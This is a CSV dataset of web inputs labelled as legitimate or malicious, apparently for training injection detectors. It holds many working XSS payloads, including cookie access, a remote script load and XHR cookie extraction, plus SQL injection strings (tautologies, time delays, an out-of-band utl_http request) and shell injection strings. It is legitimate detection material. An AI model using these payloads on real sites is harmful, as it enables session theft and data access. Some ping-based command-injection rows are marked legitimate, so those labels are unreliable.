index,payload,is_malicious,injection_type
639,"""><i[%00]mg onerror=alert(1) src=a>",1.0,XSS
640,33120,0.0,LEGAL
641,mos*tear,0.0,LEGAL
642,peasants,0.0,LEGAL
643,33729,0.0,LEGAL
644,quandary,0.0,LEGAL
645,otkznzcw@,0.0,LEGAL
646,inspecting,0.0,LEGAL
647,insinuated,0.0,LEGAL
648,steadfastness,0.0,LEGAL
649,Jaymee,0.0,LEGAL
650,mc_13653_639,0.0,LEGAL
651,lets,0.0,LEGAL
652,http%3A%2F%2Fwww.homeaway.com%2Fthirdparty%2Fad%2Fhan.ha%2Fhome.us%3Bptype%3Dhp%3Blang%3Dus%3Bsite%3Dha%3Bowne,0.0,LEGAL
653,laffin%40muchapolicia.tf,0.0,LEGAL
654,Unzurrunzaga,0.0,LEGAL
655,shortening,0.0,LEGAL
656,subroutine,0.0,LEGAL
657,recompiles,0.0,LEGAL
658,downs,0.0,LEGAL
659,dip,0.0,LEGAL
660,cowslip,0.0,LEGAL
661,th,0.0,LEGAL
662,Meggie,0.0,LEGAL
663,philippe,0.0,LEGAL
664,Adaline,0.0,LEGAL
665,singlet,0.0,LEGAL
666,Marylin,0.0,LEGAL
667,Yankees,0.0,LEGAL
668,Navalonguilla,0.0,LEGAL
669,bisects,0.0,LEGAL
670,magnificent,0.0,LEGAL
671,capillary,0.0,LEGAL
672,spooned,0.0,LEGAL
673,Scovill,0.0,LEGAL
674,6629,0.0,LEGAL
675,joshua,0.0,LEGAL
676,32830,0.0,LEGAL
677,baladrero,0.0,LEGAL
678,<Q%^&*(£@!’” style=\-\mo\z\-b\i\nd\in\g:\url(//business\i\nfo.co.uk\/labs\/xbl\/xbl\.xml\#xss)>,1.0,XSS
679,"-1<DIV STYLE=""background-image: url(javascript:document.cookie=true;)"">",1.0,XSS
680,terrie,0.0,LEGAL
681,Einstein+185%2C+6%3FF,0.0,LEGAL
682,schkorski%40elxxi.zr,0.0,LEGAL
683,/modules/osticket/admin.php,0.0,LEGAL
684,pervert,0.0,LEGAL
685,abducts,0.0,LEGAL
686,'||utl_http.request('httP://192.168.1.1/')||',1.0,SQL
687,ATE7t3r,0.0,LEGAL
688,glaciers,0.0,LEGAL
689,"<img src onerror /"" \'""= alt=alert(1)//"">",1.0,XSS
690,pickles,0.0,LEGAL
691,84428224P,0.0,LEGAL
692,Corry,0.0,LEGAL
693,intercommunicate,0.0,LEGAL
694,4421,0.0,LEGAL
695,winders,0.0,LEGAL
696,Daloris,0.0,LEGAL
697,starved,0.0,LEGAL
698,sorghum,0.0,LEGAL
699,Trobos+39+4E,0.0,LEGAL
700,26397342N,0.0,LEGAL
701,Carde%F1a,0.0,LEGAL
702,42462633X,0.0,LEGAL
703,Taiwanese,0.0,LEGAL
704,AGiWqtxgZ2s2Psyvb5qWWEvZJhozYjRXxA,0.0,LEGAL
705,growling,0.0,LEGAL
706,16708,0.0,LEGAL
707,Marchelle,0.0,LEGAL
708,idbc,0.0,LEGAL
709,Pepita,0.0,LEGAL
710,reckless,0.0,LEGAL
711,Harli,0.0,LEGAL
712,'/onmouseover='alert(1);'/a=,1.0,XSS
713,9978092999259297,0.0,LEGAL
714,Tilda,0.0,LEGAL
715,stint,0.0,LEGAL
716,t0t0,0.0,LEGAL
717,<script>alert(123)</script>,1.0,XSS
718,04803273E,0.0,LEGAL
719,occasioned,0.0,LEGAL
720,Margalit,0.0,LEGAL
721,freedom,0.0,LEGAL
722,feathering,0.0,LEGAL
723,2095,0.0,LEGAL
724,10529965708454013985,0.0,LEGAL
725,Marazuela,0.0,LEGAL
726,Mu%F1oz+Birosta,0.0,LEGAL
727,extensive,0.0,LEGAL
728,Benavente,0.0,LEGAL
729,1331912264,0.0,LEGAL
730,carbonizing,0.0,LEGAL
731,Devota,0.0,LEGAL
732,17240,0.0,LEGAL
733,2930629510541352,0.0,LEGAL
734,curvature,0.0,LEGAL
735,7242,0.0,LEGAL
736,flori%40casabolsa43.np,0.0,LEGAL
737,zapata,0.0,LEGAL
738,C%2F+David+169+6-H,0.0,LEGAL
739,Kellogg,0.0,LEGAL
740,Miguela,0.0,LEGAL
741,sTePhaNie,0.0,LEGAL
742,Almacelles,0.0,LEGAL
743,Churchillian,0.0,LEGAL
744,space%40lingotes.com.mk,0.0,LEGAL
745,"<SCRIPT/SRC=""http:&#47;&#47;xss.rocks/xss.js""></SCRIPT>",1.0,XSS
746,hurricane,0.0,LEGAL
747,downloading,0.0,LEGAL
748,Saraann,0.0,LEGAL
749,Ziad,0.0,LEGAL
750,' and 1 in (select var from temp)--,1.0,SQL
751,ul,0.0,LEGAL
752,uncleared,0.0,LEGAL
753,deafer,0.0,LEGAL
754,Navalmoral+de+B%E9jar,0.0,LEGAL
755,49180,0.0,LEGAL
756,71997567T,0.0,LEGAL
757,C%2F+Princesa+Guajara%2C+95+13%3FE,0.0,LEGAL
758,Nery,0.0,LEGAL
759,eat,0.0,LEGAL
760,Bloc+Sant+Simo+93+,0.0,LEGAL
761,schemas,0.0,LEGAL
762,16610,0.0,LEGAL
763,94006720Q,0.0,LEGAL
764,motion,0.0,LEGAL
765,disgraces,0.0,LEGAL
766,<a href=javascript:alert(1)>click,1.0,XSS
767,"35,113,36,77",0.0,LEGAL
768,mountings,0.0,LEGAL
769,sqlvuln,1.0,SQL
770,fitted,0.0,LEGAL
771,Calle+Cortafell%2C+74+,0.0,LEGAL
772,breachers,0.0,LEGAL
773,Arcos,0.0,LEGAL
774,backlog,0.0,LEGAL
775,hagman%40codwatw.al,0.0,LEGAL
776,utf8,0.0,LEGAL
777,bhatti,0.0,LEGAL
778,concede,0.0,LEGAL
779,Alcalde+Baeza+Medina%2C+S%2FN%2C+,0.0,LEGAL
780,devan,0.0,LEGAL
781,doomed,0.0,LEGAL
782,subatomic,0.0,LEGAL
783,reposes,0.0,LEGAL
784,6898289931368660,0.0,LEGAL
785,6255787875296293,0.0,LEGAL
786,Erno,0.0,LEGAL
787,coordinations,0.0,LEGAL
788,0488545604364372,0.0,LEGAL
789,personalities,0.0,LEGAL
790,Appalachian,0.0,LEGAL
791,star,0.0,LEGAL
792,immensely,0.0,LEGAL
793,Schumacher,0.0,LEGAL
794,/./\\/././\\/./file',1.0,SHELL
795,"""><script>""",1.0,XSS
796,spoils,0.0,LEGAL
797,"<img src=""x:ö"" title=""onerror=alert(1)//"">",1.0,XSS
798,%26%26+|+dir c:%255c,1.0,SHELL
799,83716368W,0.0,LEGAL
800,<menu id=x contextmenu=x onshow=alert(1)>right click me!,1.0,XSS
801,ping\xa0-w\xa011000\xa0-n\xa01\xa01.2.3.4|rem\xa0,0.0,LEGAL
802,Calle+Las+Artes%2C+90%2C+,0.0,LEGAL
803,C%2F+Valtravieso+S%2FN%2C+,0.0,LEGAL
804,protuberant,0.0,LEGAL
805,oculto,0.0,LEGAL
806,Schulz,0.0,LEGAL
807,scaring,0.0,LEGAL
808,"-1<IMG SRC=""javascript:document.cookie=true;"">",1.0,XSS
809,<style>body{background-color:expression\(alert(1))}</style>,1.0,XSS
810,treasurer,0.0,LEGAL
811,tracy,0.0,LEGAL
812,macros,0.0,LEGAL
813,cures,0.0,LEGAL
814,8_10009;s,0.0,LEGAL
815,intending,0.0,LEGAL
816,Maddy,0.0,LEGAL
817,Joletta,0.0,LEGAL
818,modems,0.0,LEGAL
819,Merrile,0.0,LEGAL
820,http%3A%2F%2Fallsp.com%2Floading2.php%3Furl%3Dl.php%3Fid%3De189;ce,0.0,LEGAL
821,10860,0.0,LEGAL
822,oudrey%403horas.bg,0.0,LEGAL
823,Pico+De+La+Miel+151%2C+11%3FA,0.0,LEGAL
824,Masia+Can+Ruti+142%2C+1-B,0.0,LEGAL
825,storeroom,0.0,LEGAL
826,38182378D,0.0,LEGAL
827,14140,0.0,LEGAL
828,Zuya+Oca%F1a,0.0,LEGAL
829,<object/data=//127.0.0.1:3555/xss_serve_payloads/flash.swf,1.0,XSS
830,Plza.+Euzkaltzandia+56+2-B,0.0,LEGAL
831,72429722P,0.0,LEGAL
832,Toso,0.0,LEGAL
833,9168427925141243,0.0,LEGAL
834,beatably,0.0,LEGAL
835,scp,0.0,LEGAL
836,hollingw,0.0,LEGAL
837,exclamations,0.0,LEGAL
838,dives,0.0,LEGAL
839,"'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--",1.0,SQL
840,valeika%40italianmotorvillagesevilla.gd,0.0,LEGAL
841,56,0.0,LEGAL
842,chivalrous,0.0,LEGAL
843,littering,0.0,LEGAL
844,parkers,0.0,LEGAL
845,Rochette,0.0,LEGAL
846,oversees,0.0,LEGAL
847,fusado,0.0,LEGAL
848,patrician,0.0,LEGAL
849,Pyotr,0.0,LEGAL
850,"""><STYLE>@import""javascript:confirm(document.location)"";</STYLE>",1.0,XSS
851,",http%3A%2F%2Fus.ard.yahoo.com%2FSIG%3D15o69veop%2FM%3D715481.13522283.135",0.0,LEGAL
852,44709,0.0,LEGAL
853,john+herron+art+institute,0.0,LEGAL
854,Igartua,0.0,LEGAL
855,Sanl%FAcar+de+Barrameda,0.0,LEGAL
856,Ricanism,0.0,LEGAL
857,72523597C,0.0,LEGAL
858,heping,0.0,LEGAL
859,safari,0.0,LEGAL
860,vAllejuELo,0.0,LEGAL
861,"<a href=""about:<script>document.cookie=true;</script>"">",1.0,XSS
862,bins,0.0,LEGAL
863,sil6s5ana,0.0,LEGAL
864,Bentley,0.0,LEGAL
865,Anky,0.0,LEGAL
866,hemorrhoid,0.0,LEGAL
867,bustillo,0.0,LEGAL
868,bousfiel59,0.0,LEGAL
869,Gonyalon+Salobre%F1a,0.0,LEGAL
870,Plza.+Alemania%2C+134%2C+12%3FF,0.0,LEGAL
871,(18378-@@error+20363),0.0,LEGAL
872,anchoritism,0.0,LEGAL
873,nerve,0.0,LEGAL
874,impugn,0.0,LEGAL
875,advisers,0.0,LEGAL
876,splicer,0.0,LEGAL
877,wilmont,0.0,LEGAL
878,arabella,0.0,LEGAL
879,a0r4g7,0.0,LEGAL
880,Jimmie,0.0,LEGAL
881,Siegmund,0.0,LEGAL
882,containments,0.0,LEGAL
883,pinkly,0.0,LEGAL
884,orbedad,0.0,LEGAL
885,Sennacherribbo+Castelan,0.0,LEGAL
886,absorption,0.0,LEGAL
887,http%3A%2F%2Fwatch-full-episode.blogspot.com%2F2009%2F10%2Fwatch-me,0.0,LEGAL
888,rozsabegyi.kasker%40mirata.ls,0.0,LEGAL
889,influencing,0.0,LEGAL
890,arrogate,0.0,LEGAL
891,gruffly,0.0,LEGAL
892,Angelika,0.0,LEGAL
893,phillida,0.0,LEGAL
894,||'6,1.0,SQL
895,murderers,0.0,LEGAL
896,06589399846521914371,0.0,LEGAL
897,85502696N,0.0,LEGAL
898,accepting,0.0,LEGAL
899,88341714W,0.0,LEGAL
900,Ling-Zhong,0.0,LEGAL
901,Clua+Conoto,0.0,LEGAL
902,purchased,0.0,LEGAL
903,buttoning,0.0,LEGAL
904,Salmer%F3n,0.0,LEGAL
905,Irati+Errekaren%2C+167%2C+3B,0.0,LEGAL
906,sundown,0.0,LEGAL
907,briefly,0.0,LEGAL
908,gilford_house%40pavimentosalagon.travel,0.0,LEGAL
909,bedtime,0.0,LEGAL
910,sizable,0.0,LEGAL
911,rents,0.0,LEGAL
912,Cristi,0.0,LEGAL
913,Pierre-Yves,0.0,LEGAL
914,1977.,0.0,LEGAL
915,spectroscopic,0.0,LEGAL
916,C%2F+Vella+Da+Ponte%2C+S%2FN+12H,0.0,LEGAL
917,freon,0.0,LEGAL
918,12946286718870928064,0.0,LEGAL
919,dietitian,0.0,LEGAL
920,exposes,0.0,LEGAL
921,blink,0.0,LEGAL
922,&ch=Hardware&search=%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E,1.0,XSS
923,applier,0.0,LEGAL
924,professorial,0.0,LEGAL
925,bizarre,0.0,LEGAL
926,a=<a><b>%3c%69%6d%67%2f%73%72%63%3d%31%20%6f%6e%65%72%72%6f%72%3d%61%6c%65%72%74%28%31%29%3e</b></a>document.write(unescape(a..b)),1.0,XSS
927,galactose,0.0,LEGAL
928,coulomb,0.0,LEGAL
929,1331919260,0.0,LEGAL
930,Pleistocene,0.0,LEGAL
931,revolted,0.0,LEGAL
932,surveyors,0.0,LEGAL
933,rosulkova8%40barnicesultravioleta.do,0.0,LEGAL
934,"ABC<div style=""x:\\xE2\\x80\\x82expression(javascript:alert(1)"">DEF",1.0,XSS
935,inadmissible,0.0,LEGAL
936,exactions,0.0,LEGAL
937,1331736238,0.0,LEGAL
938,Wisconsin,0.0,LEGAL
939,68441045Z,0.0,LEGAL
940,mariposa,0.0,LEGAL
941,2230,0.0,LEGAL
942,Salvia,0.0,LEGAL
943,cn,0.0,LEGAL
944,idiosyncratic,0.0,LEGAL
945,centigrade,0.0,LEGAL
946,Poole,0.0,LEGAL
947,09530,0.0,LEGAL
948,corn,0.0,LEGAL
949,http%3A%2F%2Fwatch-internet-streams-free-stream.blogspot.com%2F2009%2F11%2Fsouth-park-season-13-episode-14-stream.html,0.0,LEGAL
950,10666,0.0,LEGAL
951,Shara,0.0,LEGAL
952,ext_com,0.0,LEGAL
953,parsers,0.0,LEGAL
954,phalpher,0.0,LEGAL
955,grassier,0.0,LEGAL
956,coallier,0.0,LEGAL
957,">""<<script>document.cookie=true;</script>",1.0,XSS
958,bernie,0.0,LEGAL
959,vbscript:Execute(MsgBox(chr(88)&chr(83)&chr(83)))<,1.0,XSS
960,Adamson,0.0,LEGAL
961,reassure,0.0,LEGAL
962,purportedly,0.0,LEGAL
963,appraise,0.0,LEGAL
964,dis0reg2r,0.0,LEGAL
965,99508422A,0.0,LEGAL
966,facing,0.0,LEGAL
967,biddable,0.0,LEGAL
968,leth8,0.0,LEGAL
969,defenders,0.0,LEGAL
970,rabid,0.0,LEGAL
971,Beppie,0.0,LEGAL
972,selves,0.0,LEGAL
973,Marsan+Gallegos,0.0,LEGAL
974,michaud%40sindualidad.dd,0.0,LEGAL
975,bemoans,0.0,LEGAL
976,stressing,0.0,LEGAL
977,Corcos,0.0,LEGAL
978,"&cmd=browse&project=999999.9%27%22%3E%3CA%20onmouseover=alert%28/XSSPOSED/%29%3EXSS,%20needs%20to%20be%20fixed%20ASAP%3C/a%3E",1.0,XSS
979,guest,0.0,LEGAL
980,Devonna,0.0,LEGAL
981,weldon%40latiendadecolchones.ec,0.0,LEGAL
982,Avi%F3n,0.0,LEGAL
983,downpour,0.0,LEGAL
984,"&lt;A HREF=\\""http&#58;//%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\\""&gt;XSS&lt;/A&gt;",1.0,XSS
985,teachable,0.0,LEGAL
986,o.neall,0.0,LEGAL
987,stimulation,0.0,LEGAL
988,Karrah,0.0,LEGAL
989,ti7o,0.0,LEGAL
990,strobe,0.0,LEGAL
991,Hertzog,0.0,LEGAL
992,reveled,0.0,LEGAL
993,C%2F+Huertas+Altas%2C+114+,0.0,LEGAL
994,blessing,0.0,LEGAL
995,acordelar,0.0,LEGAL
996,alwin,0.0,LEGAL
997,surmounted,0.0,LEGAL
998,'><iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29; >,1.0,XSS
999,sternly,0.0,LEGAL
1000,not,0.0,LEGAL
1001,affection,0.0,LEGAL
1002,comments,0.0,LEGAL
1003,m01RoS%EDa,0.0,LEGAL
1004,largeness,0.0,LEGAL
1005,<svg><script xss>\u0061l\u0065rt`X`</script>,1.0,XSS
1006,retrospection,0.0,LEGAL
1007,pedestal,0.0,LEGAL
1008,"javascript:/*-->]]>%>?></script></title></textarea></noscript></style></xmp>"">[img=1,name=/alert(1)/.source]<img -/style=a:expression&#40&#47&#42'/-/*&#39,/**/eval(name)/*%2A///*///&#41;;width:100%;height:100%;position:absolute;-ms-behavior:url(#default#time2) name=alert(1) onerror=eval(name) src=1 autofocus onfocus=eval(name) onclick=eval(name) onmouseover=eval(name) onbegin=eval(name) background=javascript:eval(name)//>""",1.0,XSS
1009,bouroncl,0.0,LEGAL
1010,72684781C,0.0,LEGAL
1011,http%3A%2F%2Fbbc0.blogspot.com%2F2009%2F07%2Fplastic.html,0.0,LEGAL
1012,bowstrings,0.0,LEGAL
1013,Pomona,0.0,LEGAL
1014,ania,0.0,LEGAL
1015,Roddy,0.0,LEGAL
1016,DBMS_LOCK.SLEEP(50);,1.0,SQL
1017,"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--",1.0,SQL
1018,iteration,0.0,LEGAL
1019,papa,0.0,LEGAL
1020,1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2)  attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=alert(1)&gt;>,1.0,XSS
1021,Corsica,0.0,LEGAL
1022,Esta,0.0,LEGAL
1023,plumbers,0.0,LEGAL
1024,"""><div style=width:1px;filter:glow onfilterchange=alert(1)>x",1.0,XSS
1025,hopelessly,0.0,LEGAL
1026,ferret,0.0,LEGAL
1027,usr,0.0,LEGAL
1028,envelope,0.0,LEGAL
1029,salaries,0.0,LEGAL
1030,motionlessly,0.0,LEGAL
1031,3309243329438501,0.0,LEGAL
1032,sayle%40miemail.com.ic,0.0,LEGAL
1033,"<INPUT+TYPE=""checkbox""+onDblClick=confirm(XSS)>",1.0,XSS
1034,Ingaberg,0.0,LEGAL
1035,notice,0.0,LEGAL
1036,32727347A,0.0,LEGAL
1037,proprietors,0.0,LEGAL
1038,7470621592954043,0.0,LEGAL
1039,Graeme,0.0,LEGAL
1040,lifters,0.0,LEGAL
1041,Pla%E7a+Sant+Joan%2C+56+5C,0.0,LEGAL
1042,earl,0.0,LEGAL
1043,1331919531,0.0,LEGAL
1044,puppies,0.0,LEGAL
1045,Passatge+Del+Mercat+18+,0.0,LEGAL
1046,dogmas,0.0,LEGAL
1047,Puente+de+Domingo+Fl%F3rez,0.0,LEGAL
1048,reanalyze,0.0,LEGAL
1049,capitalists,0.0,LEGAL
1050,Viva,0.0,LEGAL
1051,"|ping,-w,11000,-n,1,1.2.3.4|rem,",0.0,LEGAL
1052,34327,0.0,LEGAL
1053,Ahuanari+Cardenas,0.0,LEGAL
1054,Pla%E7a+Lloreda%2C+155+,0.0,LEGAL
1055,taimarse,0.0,LEGAL
1056,02683341T,0.0,LEGAL
1057,44250583D,0.0,LEGAL
1058,frederick%40ofertachina.wf,0.0,LEGAL
1059,tablespoons,0.0,LEGAL
1060,Yousef,0.0,LEGAL
1061,Aisha,0.0,LEGAL
1062,Victoria%2C+La,0.0,LEGAL
1063,Calle+Dos+Reis+49+,0.0,LEGAL
1064,88253687L,0.0,LEGAL
1065,Ghassan,0.0,LEGAL
1066,03482859S,0.0,LEGAL
1067,6493388597941194,0.0,LEGAL
1068,prize,0.0,LEGAL
1069,olesen,0.0,LEGAL
1070,odbc,0.0,LEGAL
1071,teitelba,0.0,LEGAL
1072,Jak,0.0,LEGAL
1073,larese,0.0,LEGAL
1074,51858384P,0.0,LEGAL
1075,8072420100013929,0.0,LEGAL
1076,reddest,0.0,LEGAL
1077,Gloriana,0.0,LEGAL
1078,"<a target=""x"" href=""xssme?xss=<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe src=%22javascript:parent.x(window);%22></iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', '.', true);xhr.onload = function() { confirm(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();",1.0,XSS
1079,fulminate,0.0,LEGAL
1080,<iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>,1.0,XSS
1081,"""><img src=""blah""onmouseover=""alert(1);"">",1.0,XSS
1082,96TO3a38,0.0,LEGAL
1083,9735,0.0,LEGAL
1084,'><script>eval(‘al’+’ert(1)’);</script>,1.0,XSS
1085,commences,0.0,LEGAL
1086,tawny,0.0,LEGAL
1087,Hebelen,0.0,LEGAL
1088,38408789P,0.0,LEGAL
1089,Ossama,0.0,LEGAL
1090,Isabel+La+Catolica%2C+5+,0.0,LEGAL
1091,climaxed,0.0,LEGAL
1092,Tele,0.0,LEGAL
1093,convolution,0.0,LEGAL
1094,Lafuente+Baracaldo,0.0,LEGAL
1095,compactest,0.0,LEGAL
1096,9135,0.0,LEGAL
1097,08693,0.0,LEGAL
1098,06950387398840179129,0.0,LEGAL
1099,carefully,0.0,LEGAL
1100,Miran,0.0,LEGAL
1101,speckled,0.0,LEGAL
1102,"""><scri<script></script>pt>confirm(document.cookie);</scri<script></script>pt>",1.0,XSS
1103,Margit,0.0,LEGAL
1104,"<!--#echo var=""http_accept"" -->",1.0,XSS
1105,greed,0.0,LEGAL
1106,"""%26prompt(9)%26""",1.0,XSS
1107,Merunix,0.0,LEGAL
1108,Crespi+Nou,0.0,LEGAL
1109,"<div  style=""position:absolute;top:0;left:0;width:100%;height:100%""  onmouseover=""prompt(1)"" onclick=""alert(1)"">x</button>​",1.0,XSS
1110,anything,0.0,LEGAL
1111,http%3A%2F%2Fad.yieldmanager.com%2Fiframe3%3FGAMAAKr6BQDO0zAAAAAAAIieDQAAAAAAAAAAAAoAAAAAAA0ADAAECQxSEwAAAAAAPkwTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADgSQMAAAAAAAIAAgAAAAAAAAAAAAAA4D8AAAAAAADgPwAAAAAAAOA.AAAAAAAA4D8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABJVrBVtqVDB93eInph-6ka45O5dss4dAeP0thmAAAAAA%3D%3D%2C%2Chttp%,0.0,LEGAL
1112,ping\x0b-w\x0b7000\x0b-n\x0b1\x0b4.3.2.1,0.0,LEGAL
1113,Haines,0.0,LEGAL
1114,Sigrid,0.0,LEGAL
1115,56632037B,0.0,LEGAL
1116,abundance,0.0,LEGAL
1117,patching,0.0,LEGAL
1118,3270734525112576,0.0,LEGAL
1119,sylvie,0.0,LEGAL
1120,Jean,0.0,LEGAL
1121,or5ina8ia,0.0,LEGAL
1122,Tizon+96+7-C,0.0,LEGAL
1123,anesthetics,0.0,LEGAL
1124,merrile,0.0,LEGAL
1125,Obrador+Caubet,0.0,LEGAL
1126,Bosporus,0.0,LEGAL
1127,congratulate,0.0,LEGAL
1128,Ma%F1aria,0.0,LEGAL
1129,Nicoline,0.0,LEGAL
1130,"11,201",0.0,LEGAL
1131,3470754275617444,0.0,LEGAL
1132,"<IMG SRC=""jav&#x09;ascript:alert(<WBR>'XSS');"">",1.0,XSS
1133,roughest,0.0,LEGAL
1134,ablated,0.0,LEGAL
1135,certifies,0.0,LEGAL
1136,"<a href=""\xE2\x80\x8Ajavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1.0,XSS
1137,tediousness,0.0,LEGAL
1138,Celle,0.0,LEGAL
1139,Kaskaskia,0.0,LEGAL
1140,"admin"" or ""1""=""1""#",1.0,SQL
1141,03517,0.0,LEGAL
1142,tabular,0.0,LEGAL
1143,Hera+Vil%E0,0.0,LEGAL
1144,",,http%3A%2F%2Fwww.pokezam.com%2Fanime%2Fpictures%2Findigo%2F038.php,;ord",0.0,LEGAL
1145,dann,0.0,LEGAL
1146,sobered,0.0,LEGAL
1147,dacia,0.0,LEGAL
1148,impacting,0.0,LEGAL
1149,65898171C,0.0,LEGAL
1150,04656361795949709077,0.0,LEGAL
1151,Alaball,0.0,LEGAL
1152,C%2F+Ferriol%2C+105+11%3FD,0.0,LEGAL
1153,Benito+Perez+Galdos%2C+62%2C+,0.0,LEGAL
1154,neutrality,0.0,LEGAL
1155,Rivas%2C+100%2C+,0.0,LEGAL
1156,countermeasures,0.0,LEGAL
1157,translated,0.0,LEGAL
1158,lavecchi,0.0,LEGAL
1159,alonzo%40colorprint.eh,0.0,LEGAL
1160,Villa+de+Ves,0.0,LEGAL
1161,retains,0.0,LEGAL
1162,illumination,0.0,LEGAL
1163,miscellaneously,0.0,LEGAL
1164,maslow%40etxarriaranatz.mil,0.0,LEGAL
1165,4907598174142069,0.0,LEGAL
1166,Brandt,0.0,LEGAL
1167,1257284194,0.0,LEGAL
1168,1258737509150,0.0,LEGAL
1169,enumerated,0.0,LEGAL
1170,membrane,0.0,LEGAL
1171,Jos,0.0,LEGAL
1172,mcveety,0.0,LEGAL
1173,Masood,0.0,LEGAL
1174,Wenceslada,0.0,LEGAL
1175,experimenter,0.0,LEGAL
1176,mileage,0.0,LEGAL
1177,litigation,0.0,LEGAL
1178,http%3A%2F%2Fmashable.com%2F2007%2F10%2F27%2Ftop-10-linkedin-tools%2F,0.0,LEGAL
1179,Ghassem,0.0,LEGAL
1180,notched,0.0,LEGAL
1181,"'><script\x09type=""text/javascript"">javascript:alert(1);</script>",1.0,XSS
1182,1442974784880841,0.0,LEGAL
1183,c6he5era,0.0,LEGAL
1184,Avda.+Fernando+Ferrerio+S%2FN+,0.0,LEGAL
1185,overwork,0.0,LEGAL
1186,papers,0.0,LEGAL
1187,waller,0.0,LEGAL
1188,lissa5,0.0,LEGAL
1189,Deneb,0.0,LEGAL
1190,Bolado+Pellicer,0.0,LEGAL
1191,Tildi,0.0,LEGAL
1192,"<iframe src=""data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E""></iframe>",1.0,XSS
1193,Hildebaldo,0.0,LEGAL
1194,Adele,0.0,LEGAL
1195,McAdam,0.0,LEGAL
1196,financier,0.0,LEGAL
1197,Capllonc+Carreto,0.0,LEGAL
1198,2738587745944540,0.0,LEGAL
1199,bullish,0.0,LEGAL
1200,Muriel+de+la+Fuente,0.0,LEGAL
1201,C%2F+Madrid%2C+53+5-F,0.0,LEGAL
1202,autobiography,0.0,LEGAL
1203,Kinman,0.0,LEGAL
1204,unjustly,0.0,LEGAL
1205,Merrili,0.0,LEGAL
1206,0952684753761589,0.0,LEGAL
1207,13103692V,0.0,LEGAL
1208,interchangeability,0.0,LEGAL
1209,"<svg xmlns=""http://www.w3.org/2000/svg"" id=""foo""><x xmlns=""http://www.w3.org/2001/xml-events"" event=""load"" observer=""foo"" handler=""data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Chandler%20xml%3Aid%3D%22bar%22%20type%3D%22application%2Fecmascript%22%3E alert(1) %3C%2Fhandler%3E%0A%3C%2Fsvg%3E%0A#bar""/></svg>",1.0,XSS
1210,transfers,0.0,LEGAL
1211,26325,0.0,LEGAL
1212,doldrum,0.0,LEGAL
1213,1044,0.0,LEGAL
1214,5152813743878786,0.0,LEGAL
1215,shamed,0.0,LEGAL
1216,Hildegaard,0.0,LEGAL
1217,overlooks,0.0,LEGAL
1218,8866,0.0,LEGAL
1219,hired,0.0,LEGAL
1220,B4A7DA1C6,0.0,LEGAL
1221,reprove,0.0,LEGAL
1222,CarlosMar%EDa,0.0,LEGAL
1223,enlarging,0.0,LEGAL
1224,gall%F3n,0.0,LEGAL
1225,"ABC<div style=""x:\xE2\x80\x85expression(javascript:alert(1)"">DEF",1.0,XSS
1226,bombardment,0.0,LEGAL
1227,6486963131511562,0.0,LEGAL
1228,patterings,0.0,LEGAL
1229,efforts,0.0,LEGAL
1230,Doralyn,0.0,LEGAL
1231,inductive,0.0,LEGAL
1232,De47aducha,0.0,LEGAL
1233,2ab%2198,0.0,LEGAL
1234,speeds,0.0,LEGAL
1235,homemaker,0.0,LEGAL
1236,Yoshi,0.0,LEGAL
1237,monEder-%EDa,0.0,LEGAL
1238,coya,0.0,LEGAL
